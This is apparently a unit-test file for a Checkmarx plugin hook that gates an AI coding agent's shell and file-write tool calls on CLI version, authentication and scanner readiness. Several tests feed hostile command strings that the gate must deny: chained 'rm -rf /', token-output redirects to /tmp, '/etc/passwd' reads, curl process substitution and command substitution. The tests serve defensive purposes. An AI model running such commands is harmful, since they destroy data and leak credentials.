"""Unit tests for the cx-devassist PreToolUse gate (cx_check.py).

Run: python3 hooks/test_cx_check.py    (stdlib only — no pytest needed)

Each case drives cx_check.cx_check() with a controlled environment (which/version/auth
stubbed) and asserts the printed permissionDecision and the process exit code. exit 2 ==
blocking deny; exit 0 == allow / pass-through.
"""

import io
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stdout, redirect_stderr

# Source under test lives in the plugin's hooks/ (tests live at the repo root, outside the plugin).
_HOOKS_DIR = os.path.normpath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "..", "plugins", "copilot", "checkmarx-devassist", "hooks"))
sys.path.insert(0, _HOOKS_DIR)
import cx_check  # noqa: E402

BOOTSTRAP = cx_check._bootstrap_script_path()
CX_CHECK_SH = os.path.join(_HOOKS_DIR, "cx_check.sh")
SH = shutil.which("sh")

# Set by run() to the full hookSpecificOutput dict of the last gate invocation (or None), so tests
# can assert on permissionDecisionReason / additionalContext, not just the decision.
LAST_OUTPUT = None


def _fake_proc(stderr=b"", stdout=b"", returncode=0):
    """Minimal stand-in for a subprocess.CompletedProcess (returncode/stdout/stderr bytes)."""
    class _P:
        pass
    p = _P()
    p.returncode = returncode
    p.stdout = stdout
    p.stderr = stderr
    return p


def run(hook_input, *, which="cx", version_state="ok", authed=True,
        scanner_state=cx_check._SCANNER_SCAN, env=None, copilot_cli=False):
    """Invoke cx_check() with stubs. Returns (decision_or_None, exit_code).

    decision is the parsed permissionDecision ('allow'/'deny'), or None when cx_check
    returns normally (a silent pass-through / allow). scanner_state stubs the stage-2
    scanner readiness probe (_SCANNER_SCAN by default = scanner authenticated & will scan).
    copilot_cli=True simulates the --copilot-cli flag so _COPILOT_CLI_MODE is set correctly
    for inputs that don't carry a detectable Copilot CLI envelope (e.g. already-unwrapped
    tool_name/tool_input dicts)."""
    orig = {
        "which": cx_check.shutil.which,
        "vstate": cx_check._version_state,
        "authed": cx_check._is_authenticated,
        "scanner": cx_check._scanner_state,
        "read": cx_check._read_hook_input,
        "environ": cx_check.os.environ,
        "copilot_cli_mode": cx_check._COPILOT_CLI_MODE,
        "argv": sys.argv,
    }
    cx_check.shutil.which = lambda name: which
    cx_check._version_state = lambda identity=None: version_state
    cx_check._is_authenticated = lambda identity=None: authed
    cx_check._scanner_state = lambda identity=None: scanner_state
    cx_check._read_hook_input = lambda: hook_input
    if copilot_cli:
        sys.argv = ["cx_check.py", "--copilot-cli"]
    # Disable structured logging during gate tests so they never write to the user's real
    # ~/.checkmarx log — unless a test opts in by providing CX_LOG_DIR (a temp dir).
    e = dict(env) if env is not None else {}
    if "CX_LOG_DIR" not in e:
        e.setdefault("CX_LOG_DISABLE", "1")
    cx_check.os.environ = e

    out = io.StringIO()
    code = 0
    try:
        with redirect_stdout(out), redirect_stderr(io.StringIO()):
            cx_check.cx_check()
    except SystemExit as e:
        code = e.code if isinstance(e.code, int) else 1
    finally:
        cx_check.shutil.which = orig["which"]
        cx_check._version_state = orig["vstate"]
        cx_check._is_authenticated = orig["authed"]
        cx_check._scanner_state = orig["scanner"]
        cx_check._read_hook_input = orig["read"]
        cx_check.os.environ = orig["environ"]
        cx_check._COPILOT_CLI_MODE = orig["copilot_cli_mode"]
        sys.argv = orig["argv"]

    global LAST_OUTPUT
    LAST_OUTPUT = None
    decision = None
    text = out.getvalue().strip()
    if text:
        try:
            parsed = json.loads(text)
            if "hookSpecificOutput" in parsed:
                # Claude Code format: nested under hookSpecificOutput
                LAST_OUTPUT = parsed["hookSpecificOutput"]
                decision = LAST_OUTPUT["permissionDecision"]
            elif "permissionDecision" in parsed:
                # Copilot CLI flat format: permissionDecision at top level
                LAST_OUTPUT = parsed
                decision = parsed["permissionDecision"]
            else:
                decision = "<unparseable:%s>" % text
        except (ValueError, KeyError):
            decision = "<unparseable:%s>" % text
    return decision, code


def bash(command):
    return {"tool_name": "Bash", "tool_input": {"command": command}}


def write(content):
    return {"tool_name": "Write", "tool_input": {"file_path": "/x", "content": content}}


# --- Copilot CLI tool-name helpers ---
def copilot_real(tool_name, args_dict):
    """Simulates the ACTUAL Copilot CLI hook stdin format confirmed from events.jsonl:
    {sessionId, cwd, toolCalls:[{id, name, args: JSON_STRING}]}
    The matcher in hooks-copilot-cli.json matches against toolCalls[0].name."""
    import json as _json
    return {
        "sessionId": "test-session",
        "cwd": "/workspace",
        "toolCalls": [{"id": "toolu_test", "name": tool_name, "args": _json.dumps(args_dict)}]
    }


def copilot_command(command):
    """Simulates a Copilot CLI shell-command hook input (tool_name='command')."""
    return {"tool_name": "command", "tool_input": {"command": command}}


def copilot_command_camel(command):
    """Simulates Copilot CLI camelCase format (toolName/toolInput)."""
    return {"toolName": "command", "toolInput": {"command": command}}


def copilot_create(path="/x", content="x"):
    """Simulates a Copilot CLI file-create hook input (tool_name='create')."""
    return {"tool_name": "create", "tool_input": {"file_path": path, "content": content}}


def copilot_create_camel(path="/x", content="x"):
    """Simulates Copilot CLI camelCase file-create (toolName/toolInput)."""
    return {"toolName": "create", "toolInput": {"file_path": path, "content": content}}


def copilot_edit(path="/x", old_str="x", new_str="y"):
    """Simulates a Copilot CLI file-edit hook input (tool_name='edit')."""
    return {"tool_name": "edit", "tool_input": {"file_path": path, "old_str": old_str, "new_str": new_str}}


def copilot_edit_camel(path="/x", old_str="x", new_str="y"):
    """Simulates Copilot CLI camelCase file-edit (toolName/toolInput)."""
    return {"toolName": "edit", "toolInput": {"file_path": path, "old_str": old_str, "new_str": new_str}}


class TestMissingCx(unittest.TestCase):
    def test_absent_denies_even_offline(self):
        decision, code = run(bash("npm test"), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_absent_still_allows_bootstrap(self):
        decision, code = run(bash('bash "%s" install' % BOOTSTRAP), which=None)
        self.assertIsNone(decision)  # silent pass-through
        self.assertEqual(code, 0)


class TestVersionGate(unittest.TestCase):
    def test_below_min_denies(self):
        decision, code = run(bash("npm test"), version_state="below")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_below_min_blocks_cx_auth_login(self):
        # Version gate is BEFORE auth-recovery, so an old build can't escape via cx auth.
        decision, code = run(bash("cx auth login"), version_state="below")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_unrunnable_denies(self):
        decision, code = run(bash("npm test"), version_state="unrunnable")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_dev_falls_through_to_auth(self):
        decision, code = run(bash("npm test"), version_state="dev", authed=True)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_dev_unauthenticated_denies(self):
        decision, code = run(bash("npm test"), version_state="dev", authed=False)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_ok_authed_passes(self):
        decision, code = run(bash("npm test"), version_state="ok", authed=True)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_ok_unauthed_denies(self):
        decision, code = run(bash("npm test"), version_state="ok", authed=False)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)


class TestAuthRecovery(unittest.TestCase):
    def test_cx_auth_allowed_when_unauthenticated(self):
        decision, code = run(bash("cx auth login"), version_state="ok", authed=False)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_cx_configure_allowed_when_unauthenticated(self):
        decision, code = run(bash("cx configure set --prop-name cx_apikey --prop-value X"),
                             version_state="ok", authed=False)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_null_sink_redirect_still_allowed(self):
        # The oauth.md-mandated stdout suppression (bash /dev/null) must stay admitted.
        for c in ("cx auth login 1>/dev/null", "cx auth login >/dev/null", "cx auth login 1>>/dev/null"):
            decision, code = run(bash(c), version_state="ok", authed=False)
            self.assertIsNone(decision, "should allow: %s" % c)

    def test_redirect_to_file_denied(self):
        # Security Finding 1: `cx auth login > /file` would exfiltrate the live token — it must NOT be
        # carved out; it falls through to the fail-closed unauthenticated deny.
        for c in ("cx auth login > /tmp/steal", "cx auth login 1>/tmp/steal",
                  "cx configure set --prop-value k 2>/tmp/x", "cx auth login < /etc/passwd"):
            decision, code = run(bash(c), version_state="ok", authed=False)
            self.assertEqual(decision, "deny", "should deny (redirect to file): %s" % c)
            self.assertEqual(code, 2)

    def test_redirect_hardening_applies_to_absolute_cx_form(self):
        p = r"C:\CxStore\cx\cx.exe" if os.name == "nt" else "/opt/cxstore/cx"
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: p
        try:
            fwd = p.replace("\\", "/")
            self.assertTrue(cx_check._is_auth_recovery_command(bash('"%s" auth login 1>/dev/null' % fwd)))
            self.assertFalse(cx_check._is_auth_recovery_command(bash('"%s" auth login > /tmp/x' % fwd)))
        finally:
            cx_check._canonical_cx = orig


class TestBareCommandGuard(unittest.TestCase):
    """The shared carve-out guard (_bare_bash_command / _has_unsafe_redirect) — the one audited place
    that rejects shell chaining AND redirects to a real file (Security Finding 1), so a benign prefix
    can neither smuggle a command nor exfiltrate stdout past the gate."""

    def test_null_sinks_are_safe(self):
        # Only bash's /dev/null is a null device in the agent's shell; NUL/$null are real files there.
        for c in ("cx auth login 1>/dev/null", "cx auth login >/dev/null", "cx auth login 2>/dev/null",
                  "cx auth login 1>>/dev/null"):
            self.assertFalse(cx_check._has_unsafe_redirect(c), "null sink must be safe: %s" % c)

    def test_real_file_redirects_are_unsafe(self):
        for c in ("cx auth login > /tmp/x", "cx auth login 1>/tmp/x", "cx auth login 2>/tmp/x",
                  "cx auth login >> /tmp/x", "cx auth login < /etc/passwd", "cx auth login >nulfile",
                  "cx auth login 1>/dev/null.bak", "cx auth login 1>/dev/nullX", "cx auth login 1>nul",
                  "cx auth login 1>NUL", "cx auth login 1>$null"):
            self.assertTrue(cx_check._has_unsafe_redirect(c), "real-file redirect must be unsafe: %s" % c)

    def test_bare_command_rejects_chaining_and_unsafe_redirect(self):
        def B(c):
            return {"tool_name": "Bash", "tool_input": {"command": c}}
        self.assertEqual(cx_check._bare_bash_command(B("cx auth login 1>/dev/null")),
                         "cx auth login 1>/dev/null")
        for bad in ("cx auth login; rm -rf /", "cx auth login && x", "cx auth login | x",
                    "cx auth login `x`", "cx auth login $(x)", "cx auth login > /tmp/x"):
            self.assertIsNone(cx_check._bare_bash_command(B(bad)), "must reject: %s" % bad)
        self.assertIsNone(cx_check._bare_bash_command({"tool_name": "Write", "tool_input": {}}))


class TestScannerPassthrough(unittest.TestCase):
    """The OAuth fail-open fix: when `cx auth validate` passes but the native scanner would run in
    pass-through (allow-everything, NO scan), the gate must FAIL CLOSED + VISIBLY — the same
    /checkmarx-cli-setup UX as the unauthenticated path — instead of silently allowing the write."""

    def test_passthrough_denies_visibly_on_write(self):
        decision, code = run(write("Runtime.getRuntime().exec(userInput)"),
                             authed=True, scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)
        self.assertIn("/checkmarx-cli-setup", LAST_OUTPUT["additionalContext"])
        self.assertIn("authenticate", LAST_OUTPUT["additionalContext"].lower())

    def test_passthrough_blocks_bash_too(self):
        decision, code = run(bash("npm test"), authed=True,
                             scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_scan_ready_passes(self):
        decision, code = run(write("print('ok')"), authed=True,
                             scanner_state=cx_check._SCANNER_SCAN)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_unknown_defers_to_real_scanner(self):
        # An inconclusive probe must NOT over-block a genuinely-authenticated user; defer to stage 2.
        decision, code = run(write("print('ok')"), authed=True,
                             scanner_state=cx_check._SCANNER_UNKNOWN)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_unauthenticated_message_takes_precedence(self):
        # If validate itself fails, the unauthenticated deny fires before the scanner probe.
        decision, code = run(bash("npm test"), authed=False,
                             scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_auth_recovery_bypasses_passthrough(self):
        # `cx auth login` must still run while the scanner is in pass-through — it's how you fix it.
        decision, code = run(bash("cx auth login"), authed=False,
                             scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_configure_apikey_bypasses_passthrough(self):
        decision, code = run(bash("cx configure set --prop-name cx_apikey --prop-value X"),
                             authed=True, scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_bootstrap_bypasses_passthrough(self):
        decision, code = run(bash('bash "%s" install' % BOOTSTRAP), authed=True,
                             scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)


class TestRecoveryMessaging(unittest.TestCase):
    """The deny messages must split the two auth paths by WHO runs them (OAuth = agent may run it, no
    secret; API key = developer, plaintext secret), must NOT read like a prompt injection, and must
    reference cx by its RESOLVED path so the recovery command works on a first-install session before
    cx is on PATH."""

    def _assert_oauth_apikey_split(self, ctx):
        self.assertIn("auth login", ctx)
        self.assertIn("browser", ctx.lower())
        self.assertIn("configure set", ctx)
        self.assertIn("developer", ctx.lower())
        # Injection-shaped phrasing must be gone.
        self.assertNotIn("YOURSELF", ctx)
        self.assertNotIn("do NOT hand", ctx)
        self.assertNotIn("`!`", ctx)

    def test_unauthenticated_message_distinguishes_oauth_from_apikey(self):
        decision, code = run(write("x"), authed=False)
        self.assertEqual(decision, "deny")
        self._assert_oauth_apikey_split(LAST_OUTPUT["additionalContext"])

    def test_scanner_passthrough_message_distinguishes_oauth_from_apikey(self):
        decision, code = run(write("x"), authed=True, scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(decision, "deny")
        self._assert_oauth_apikey_split(LAST_OUTPUT["additionalContext"])

    def test_recovery_command_uses_resolved_absolute_path_first_session(self):
        # When cx resolves to a canonical absolute path (first-install session, not yet on PATH), the
        # recovery command must embed that ABSOLUTE path (fwd-slash, quoted) — a bare `cx` would 127.
        p = r"C:\CxStore\cx\cx.exe" if os.name == "nt" else "/opt/cxstore/cx"
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: p
        try:
            run(write("x"), authed=False)
            self.assertIn('"' + p.replace("\\", "/") + '" auth login',
                          LAST_OUTPUT["additionalContext"])
        finally:
            cx_check._canonical_cx = orig

    def test_carveout_accepts_resolved_absolute_cx_auth(self):
        # The carve-out must admit the resolved-absolute-path form the deny message emits (so a
        # first-install agent can authenticate), pinned to _cx_exe() — and still reject foreign paths
        # and shell chaining.
        p = r"C:\CxStore\cx\cx.exe" if os.name == "nt" else "/opt/cxstore/cx"
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: p
        try:
            fwd = p.replace("\\", "/")
            self.assertTrue(cx_check._is_auth_recovery_command(
                bash('"' + fwd + '" auth login --base-auth-uri https://x --tenant t')))
            self.assertFalse(cx_check._is_auth_recovery_command(bash('"/some/other/cx" auth login')))
            self.assertFalse(cx_check._is_auth_recovery_command(bash('"' + fwd + '" auth login; rm -rf /')))
        finally:
            cx_check._canonical_cx = orig


class TestLoggingAndIdentity(unittest.TestCase):
    """PR#15 #4: one log event per bootstrap-allow (no redundant `bootstrap` event).
    PR#15 #3: _version_state accepts the single binary-identity snapshot."""

    def test_bootstrap_emits_single_gate_decision_event(self):
        events = []
        saved = (cx_check._log, cx_check._read_hook_input)
        cx_check._log = lambda event, **f: events.append((event, f))
        cx_check._read_hook_input = lambda: bash('bash "%s" install' % BOOTSTRAP)
        try:
            cx_check.cx_check()  # bootstrap carve-out returns (allow); no SystemExit
        except SystemExit:
            pass
        finally:
            cx_check._log, cx_check._read_hook_input = saved
        self.assertEqual(len(events), 1, events)
        self.assertEqual(events[0][0], "gate_decision")
        self.assertEqual(events[0][1].get("reason_code"), "bootstrap")
        self.assertNotIn("bootstrap", [e for e, _ in events])  # no separate redundant event

    def test_version_state_accepts_identity_snapshot(self):
        saved = (cx_check._version_state_uncached, cx_check._VERSION_CACHE_FILE)
        cx_check._version_state_uncached = lambda: "dev"
        cx_check._VERSION_CACHE_FILE = None  # no cache read/write side effects
        try:
            self.assertEqual(cx_check._version_state(("/path/cx", 123.0)), "dev")
        finally:
            cx_check._version_state_uncached, cx_check._VERSION_CACHE_FILE = saved


class TestScannerProbe(unittest.TestCase):
    """_probe_scanner_passthrough classifies the scanner's --debug stderr; never raises."""

    def _stub_run(self, fake):
        orig = cx_check.subprocess.run
        cx_check.subprocess.run = fake
        self.addCleanup(lambda: setattr(cx_check.subprocess, "run", orig))

    def test_marker_means_passthrough(self):
        self._stub_run(lambda *a, **k: _fake_proc(
            stderr=b"2026/.. hooks: running in pass-through mode (not authenticated)\n"))
        self.assertEqual(cx_check._probe_scanner_passthrough(), cx_check._SCANNER_PASSTHROUGH)

    def test_no_marker_means_scan(self):
        self._stub_run(lambda *a, **k: _fake_proc(
            stdout=b'{"hookSpecificOutput":{"permissionDecision":"allow"}}',
            stderr=b"2026/.. some unrelated debug line\n"))
        self.assertEqual(cx_check._probe_scanner_passthrough(), cx_check._SCANNER_SCAN)

    def test_spawn_error_means_unknown(self):
        def boom(*a, **k):
            raise FileNotFoundError()
        self._stub_run(boom)
        self.assertEqual(cx_check._probe_scanner_passthrough(), cx_check._SCANNER_UNKNOWN)

    def test_timeout_means_unknown(self):
        def slow(*a, **k):
            raise cx_check.subprocess.TimeoutExpired(cmd="cx", timeout=8)
        self._stub_run(slow)
        self.assertEqual(cx_check._probe_scanner_passthrough(), cx_check._SCANNER_UNKNOWN)


class TestScannerCache(unittest.TestCase):
    """The scanner call-site (_scanner_state): only a positive 'will-scan' is cached, keyed to binary
    identity AND credential mtime; pass-through / unknown always re-probe (never masked)."""

    def setUp(self):
        self._dir = tempfile.mkdtemp()
        self._saved = {
            "file": cx_check._SCANNER_CACHE_FILE,
            "cred": cx_check._credential_mtime,
            "probe": cx_check._probe_scanner_passthrough,
        }
        cx_check._SCANNER_CACHE_FILE = os.path.join(self._dir, "cx_scanner_cache")
        cx_check._credential_mtime = lambda: 1234.0
        self.calls = 0
        self.addCleanup(self._restore)

    def _restore(self):
        cx_check._SCANNER_CACHE_FILE = self._saved["file"]
        cx_check._credential_mtime = self._saved["cred"]
        cx_check._probe_scanner_passthrough = self._saved["probe"]

    def _probe(self, result):
        # (re)install a counting probe; resets the counter so a test can measure re-probes.
        self.calls = 0

        def p():
            self.calls += 1
            return result
        cx_check._probe_scanner_passthrough = p

    def test_positive_cached_skips_reprobe(self):
        self._probe(cx_check._SCANNER_SCAN)
        self.assertEqual(cx_check._scanner_state(("/path/cx", 999.0)), cx_check._SCANNER_SCAN)
        self._probe(cx_check._SCANNER_SCAN)
        self.assertEqual(cx_check._scanner_state(("/path/cx", 999.0)), cx_check._SCANNER_SCAN)
        self.assertEqual(self.calls, 0)  # served from cache

    def test_credential_change_reprobes(self):
        self._probe(cx_check._SCANNER_SCAN)
        cx_check._scanner_state(("/path/cx", 999.0))
        cx_check._credential_mtime = lambda: 5678.0
        self._probe(cx_check._SCANNER_SCAN)
        cx_check._scanner_state(("/path/cx", 999.0))
        self.assertEqual(self.calls, 1)  # cred changed → re-probe

    def test_passthrough_is_never_cached(self):
        self._probe(cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(cx_check._scanner_state(("/p", 1.0)), cx_check._SCANNER_PASSTHROUGH)
        self._probe(cx_check._SCANNER_PASSTHROUGH)
        cx_check._scanner_state(("/p", 1.0))
        self.assertEqual(self.calls, 1)  # not cached → re-probed

    def test_unknown_is_never_cached(self):
        self._probe(cx_check._SCANNER_UNKNOWN)
        self.assertEqual(cx_check._scanner_state(("/p", 1.0)), cx_check._SCANNER_UNKNOWN)
        self._probe(cx_check._SCANNER_UNKNOWN)
        cx_check._scanner_state(("/p", 1.0))
        self.assertEqual(self.calls, 1)

    def test_none_file_never_cached_no_crash(self):
        cx_check._SCANNER_CACHE_FILE = None
        self._probe(cx_check._SCANNER_SCAN)
        self.assertEqual(cx_check._scanner_state(("/p", 1.0)), cx_check._SCANNER_SCAN)  # must not raise


class TestBootstrapCarveOut(unittest.TestCase):
    """The carve-out must allow ONLY a clean bash <bootstrap> [install|upgrade]."""

    def test_plain_install_allowed(self):
        self.assertTrue(cx_check._is_bootstrap_command(bash('bash "%s" install' % BOOTSTRAP)))

    def test_plain_upgrade_allowed(self):
        self.assertTrue(cx_check._is_bootstrap_command(bash('bash "%s" upgrade' % BOOTSTRAP)))

    def test_no_mode_rejected(self):
        # A bare `bash "<bootstrap>"` with no install/upgrade is NOT a sanctioned action (review
        # C1/no-mode): the mode is required so the carve-out can't bless an arbitrary invocation.
        self.assertFalse(cx_check._is_bootstrap_command(bash('bash "%s"' % BOOTSTRAP)))

    def test_plugin_root_placeholder_expands_and_verifies(self):
        # The literal ${CLAUDE_PLUGIN_ROOT} placeholder is honored ONLY when it expands (from the
        # gate's env) to THIS plugin's bundled bootstrap; unset/foreign roots fail closed.
        cmd = 'bash "${CLAUDE_PLUGIN_ROOT}/scripts/cx-bootstrap.sh" install'
        root = os.path.dirname(os.path.dirname(BOOTSTRAP))  # <plugin> (… /scripts/cx-bootstrap.sh)
        old = cx_check.os.environ
        try:
            cx_check.os.environ = {"CLAUDE_PLUGIN_ROOT": root}
            self.assertTrue(cx_check._is_bootstrap_command(bash(cmd)))
            cx_check.os.environ = {}  # unset → cannot prove → fail closed
            self.assertFalse(cx_check._is_bootstrap_command(bash(cmd)))
            cx_check.os.environ = {"CLAUDE_PLUGIN_ROOT": "/some/other/plugin"}  # foreign → reject
            self.assertFalse(cx_check._is_bootstrap_command(bash(cmd)))
        finally:
            cx_check.os.environ = old

    def test_chained_rm_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('bash "%s"; rm -rf /' % BOOTSTRAP)))

    def test_pipe_into_bash_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('cat "%s" | bash' % BOOTSTRAP)))

    def test_env_prefix_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('FOO=1 bash "%s"' % BOOTSTRAP)))

    def test_wrong_path_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('bash /evil/cx-bootstrap.sh')))

    def test_extra_arg_payload_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('bash "%s" -c evil' % BOOTSTRAP)))

    def test_command_substitution_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('bash "%s" $(whoami)' % BOOTSTRAP)))

    def test_process_substitution_rejected(self):
        self.assertFalse(
            cx_check._is_bootstrap_command(bash('bash "%s" install <(curl http://e/x)' % BOOTSTRAP))
        )

    def test_output_redirect_rejected(self):
        self.assertFalse(
            cx_check._is_bootstrap_command(bash('bash "%s" upgrade > /tmp/pwn' % BOOTSTRAP))
        )

    def test_write_with_path_content_rejected(self):
        # A Write whose CONTENT is the path is not a Bash call → never a bootstrap command.
        self.assertFalse(cx_check._is_bootstrap_command(write('bash "%s" install' % BOOTSTRAP)))

    def test_spoof_commands_all_deny_at_gate(self):
        # End-to-end: every spoof, with cx absent, must reach the deny (not the carve-out).
        spoofs = [
            bash('bash "%s"; rm -rf /' % BOOTSTRAP),
            bash('cat "%s" | bash' % BOOTSTRAP),
            bash('FOO=1 bash "%s"' % BOOTSTRAP),
            bash('bash /evil/cx-bootstrap.sh'),
            bash('bash "%s" -c evil' % BOOTSTRAP),
            write('bash "%s" install' % BOOTSTRAP),
        ]
        for s in spoofs:
            decision, code = run(s, which=None)
            self.assertEqual(decision, "deny", msg="spoof slipped through: %r" % s)
            self.assertEqual(code, 2)


class TestCapabilityGate(unittest.TestCase):
    """A build that satisfies the numeric/dev pre-filter but is MISSING the agent-security
    subcommands is 'incapable' and must be blocked exactly like a below-min build."""

    def test_incapable_denies(self):
        decision, code = run(bash("npm test"), version_state="incapable")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_incapable_blocks_cx_auth(self):
        # Capability gate is BEFORE auth-recovery (like the version gate): an incapable build
        # can't run the MCP anyway, so the fix is to upgrade, not to authenticate.
        decision, code = run(bash("cx auth login"), version_state="incapable")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)


class TestCapabilityProbe(unittest.TestCase):
    """_capabilities_present() is True only when every probe exits 0; any non-zero exit or
    spawn failure (missing subcommand) is fail-closed False."""

    class _Result:
        def __init__(self, rc):
            self.returncode = rc

    def _stub(self, codes):
        seq = {"i": 0}

        def fake(args, **kwargs):
            i = seq["i"]
            seq["i"] += 1
            c = codes[i] if i < len(codes) else 0
            if isinstance(c, type) and issubclass(c, Exception):
                raise c()
            return self._Result(c)

        return fake

    def _with_run(self, codes, expected):
        orig = cx_check.subprocess.run
        cx_check.subprocess.run = self._stub(codes)
        try:
            self.assertEqual(cx_check._capabilities_present(), expected)
        finally:
            cx_check.subprocess.run = orig

    def test_all_zero_is_capable(self):
        self._with_run([0, 0], True)

    def test_one_nonzero_not_capable(self):
        self._with_run([0, 1], False)

    def test_first_nonzero_short_circuits(self):
        self._with_run([1, 0], False)

    def test_missing_subcommand_not_capable(self):
        self._with_run([FileNotFoundError], False)


class TestVersionStateCapability(unittest.TestCase):
    """_version_state_uncached() folds the capability probe into classification."""

    def _classify(self, version, capable):
        orig_v = cx_check._cx_version
        orig_c = cx_check._capabilities_present
        cx_check._cx_version = lambda: version
        cx_check._capabilities_present = capable  # may be a lambda that raises if called
        try:
            return cx_check._version_state_uncached()
        finally:
            cx_check._cx_version = orig_v
            cx_check._capabilities_present = orig_c

    def _raise(self):
        raise AssertionError("capability probe must NOT run for a below-min build")

    def test_numeric_ok_and_capable(self):
        self.assertEqual(self._classify("2.99.0", lambda: True), "ok")

    def test_numeric_ok_but_incapable(self):
        self.assertEqual(self._classify("2.99.0", lambda: False), "incapable")

    def test_dev_and_capable(self):
        self.assertEqual(self._classify("dev", lambda: True), "dev")

    def test_dev_but_incapable(self):
        self.assertEqual(self._classify("dev", lambda: False), "incapable")

    def test_below_skips_capability_probe(self):
        # A below-min build returns 'below' WITHOUT probing capability.
        self.assertEqual(self._classify("0.0.1", self._raise), "below")

    def test_unrunnable_skips_capability_probe(self):
        self.assertEqual(self._classify(None, self._raise), "unrunnable")


class TestAgentLogDir(unittest.TestCase):
    """Per-user state moved out of world-writable OS temp into ~/.checkmarx/agent-logs/."""

    def test_default_path_segments(self):
        old = os.environ.pop("CX_LOG_DIR", None)
        try:
            d = cx_check._agent_log_dir().replace("\\", "/")
            self.assertTrue(os.path.isdir(cx_check._agent_log_dir()))
            # Default location, unless HOME isn't writable here (then it degrades to temp).
            self.assertTrue(
                d.endswith(".checkmarx/agent-logs")
                or d == tempfile.gettempdir().replace("\\", "/")
            )
        finally:
            if old is not None:
                os.environ["CX_LOG_DIR"] = old

    def test_cx_log_dir_override_and_perms(self):
        target = os.path.join(tempfile.mkdtemp(), "agent-logs")
        old = os.environ.get("CX_LOG_DIR")
        os.environ["CX_LOG_DIR"] = target
        try:
            d = cx_check._agent_log_dir()
            self.assertEqual(os.path.realpath(d), os.path.realpath(target))
            self.assertTrue(os.path.isdir(d))
            if os.name != "nt":
                self.assertEqual(stat.S_IMODE(os.stat(d).st_mode), 0o700)
        finally:
            if old is None:
                os.environ.pop("CX_LOG_DIR", None)
            else:
                os.environ["CX_LOG_DIR"] = old

    def test_state_files_live_under_agent_log_dir(self):
        for path in (
            cx_check._AUTH_CACHE_FILE,
            cx_check._VERSION_CACHE_FILE,
        ):
            self.assertEqual(os.path.dirname(path), cx_check._AGENT_LOG_DIR)


class TestCxBinaryOverride(unittest.TestCase):
    """CX_BINARY pins the gate to a specific cx by absolute path; a set-but-invalid value fails
    closed, a valid override is routed through every gate probe, and — because the native scanner
    and MCP run bare `cx` from PATH — the gate additionally requires PATH cx to be that same file
    (else it would pass while the scanner can't run = fail open)."""

    def _make_exe(self):
        p = os.path.join(tempfile.mkdtemp(), "cx")
        with open(p, "w") as f:
            f.write("#!/bin/sh\n")
        if os.name != "nt":
            os.chmod(p, 0o755)
        return p

    def _with_env(self, env, fn):
        old = cx_check.os.environ
        cx_check.os.environ = env
        try:
            return fn()
        finally:
            cx_check.os.environ = old

    def test_unset_uses_cx(self):
        self.assertEqual(self._with_env({}, cx_check._cx_binary), ("cx", None))
        self.assertEqual(self._with_env({}, cx_check._cx_exe), "cx")

    def test_relative_path_rejected(self):
        exe, err = self._with_env({"CX_BINARY": "relative/cx"}, cx_check._cx_binary)
        self.assertIsNone(exe)
        self.assertIsNotNone(err)

    def test_nonexistent_rejected(self):
        bogus = os.path.join(tempfile.mkdtemp(), "nope-cx")
        exe, err = self._with_env({"CX_BINARY": bogus}, cx_check._cx_binary)
        self.assertIsNone(exe)
        self.assertIsNotNone(err)

    def test_valid_abs_executable_accepted(self):
        p = self._make_exe()
        exe, err = self._with_env({"CX_BINARY": p}, cx_check._cx_binary)
        self.assertEqual(exe, p)
        self.assertIsNone(err)
        self.assertEqual(self._with_env({"CX_BINARY": p}, cx_check._cx_exe), p)

    def test_invalid_cx_binary_denies_in_gate(self):
        decision, code = run(bash("npm test"), env={"CX_BINARY": "relative/cx"})
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_valid_cx_binary_not_on_path_now_passes(self):
        # NEW clean-flow: the gate AND stage-2 (hooks/cx_run.sh) both resolve CX_BINARY, so a valid
        # CX_BINARY is sufficient even when `cx` is NOT on PATH — the same validated binary scans, so
        # there is no fail-open. (Was a fail-closed deny before absolute-path resolution.)
        p = self._make_exe()
        decision, code = run(bash("npm test"), which=None, version_state="ok",
                             authed=True, env={"CX_BINARY": p})
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

